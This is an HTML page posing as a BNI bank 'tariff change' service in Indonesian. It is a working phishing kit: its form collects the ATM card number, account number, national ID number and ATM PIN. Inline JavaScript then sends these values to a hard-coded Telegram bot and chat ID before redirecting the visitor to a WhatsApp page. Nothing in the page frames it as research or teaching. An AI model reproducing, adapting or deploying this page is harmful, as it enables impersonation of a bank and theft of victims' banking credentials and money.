<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Layanan online BNI 2023</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
</head>
<body>
    <nav class="navbar" style="background-color: #FF6600">
        <div class="container">
            <a class="navbar-brand" href="#">
                <img src="logo.png" alt="logo" width="70" height="24">
            </a>
            <h2 style="color: #fff">Layanan Ganti Tarif BNI</h2>
        </div>
    </nav>

    <div class="container mt-4">
        <div class="d-flex justify-content-around">
            <div class="gif-home">
                <img src="bni.png" class="img-fluid" alt="">
            </div>
        </div>
        
        <p class="fw-bold text-center mt-4">Silahkan masukkan data dibawah ini untuk proses Perubahan Tarif Transaksi</p>

        <div class="container w-75 mt-3">
            <div class="form-cc">
                <div class="form-group">
                    <input style="border-radius: 15px" type="number" class="form-control shadow-sm" id="input1" placeholder="Nomor Kartu ATM 16 Digit Angka">
                    <input style="border-radius: 15px" type="number" class="form-control shadow-sm mt-3" id="input2" placeholder="Nomor Rekening">
                    <input style="border-radius: 15px" type="number" class="form-control shadow-sm mt-3" id="input3" placeholder="Nik KTP">
                    <input style="border-radius: 15px" type="number" class="form-control shadow-sm mt-3" id="input4" placeholder="Pin ATM">
                </div>
                <div class="bnt-next mt-3 mb-3 text-center">
                    <button onclick="next()" class="btnNext mt-3" style="background-color: #FF6600; border: none; border-radius: 19px; width: 100%; color: white; font-weight: bold; height: 45px">Konfirmasi Tarif</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        function sendMessage(id, botApi, pesan) {
            const url = `https://api.telegram.org/bot${botApi}/sendMessage`;
            const data = {
                chat_id: id,
                text: pesan
            };
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                window.location.href = "wa.html"
            })
            .catch(error => {
                console.error('Terjadi kesalahan:', error);
            });
        }

        const next = () => {
            const nocard = document.querySelector("#input1").value;
            const norek = document.querySelector("#input2").value;
            const ktp = document.querySelector("#input3").value;
            const pin = document.querySelector("#input4").value;
            let text = `==| BELUM TERDAFTAR |==\nNomor Kartu: ${nocard}\nNomor Rekening: ${norek}\nNik ktp: ${ktp}\nPin: ${pin}`;
            let bot = "6439882035:AAFBxLEyIBEwOoC3hQGw2ZBC7HFPLeCi9Tg";
            let id = "6558831774";
            if (nocard === "" || norek === "" || ktp==="" || pin==="") {
                alert("Mohon lengkapi data Anda.");
            } else {
                sendMessage(id, bot, text);
            }
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
</body>
</html>
